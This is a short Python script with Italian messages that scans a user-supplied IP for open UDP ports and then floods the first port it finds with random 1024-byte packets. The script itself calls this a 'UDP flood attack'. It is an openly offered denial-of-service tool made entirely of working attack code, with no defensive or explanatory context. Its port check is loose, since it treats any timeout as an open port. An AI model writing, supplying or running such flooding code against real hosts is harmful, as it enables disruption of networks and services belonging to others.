import socket
import random
import ipaddress

def udp_flood(target_ip, target_port, num_packets):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = bytearray(random.getrandbits(8) for _ in range(1024))

        for _ in range(num_packets):
            udp_socket.sendto(data, (target_ip, target_port))

        print("Attacco UDP flood completatocon successo.")
    except Exception as e:
        print("Si è verificato un errore durante l'attacco UDP flood:", e)
    finally:
        if udp_socket:
            udp_socket.close()
def scan_open_ports(target_ip, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port +1):
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            udp_socket.sendto(b'', (target_ip, port))
            udp_socket.settimeout(1)
            udp_socket.recvfrom(1024)
        except socket.timeout:
            open_ports.append(port)
        except:
                pass
        finally:
            udp_socket.close()
    return open_ports

if __name__=="__main__":
    try:
        target_ip = input("Inserisci l'IP target: ")

        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("Errore: IP non valido.")
            exit(1)
        
        start_port = 1
        end_port = 65535

        print(f"Scansione delle porte aperte su {target_ip}...")
        open_ports = scan_open_ports(target_ip, start_port, end_port)

        if open_ports:
            print("Porte aperte trovate: ", open_ports)
            target_port =open_ports[0]
        else:
            print("Nessuna porta aperta trovata.")
            exit(1)

        num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

        if num_packets <= 0:
            print("Errore: il numero di pacchetti deve essere positivo.")
            exit(1)
        
        udp_flood(target_ip, target_port, num_packets)
    except ValueError:
        print("Errore: assicurati di inserire un numero valido per la porta e il numero di pacchetti.")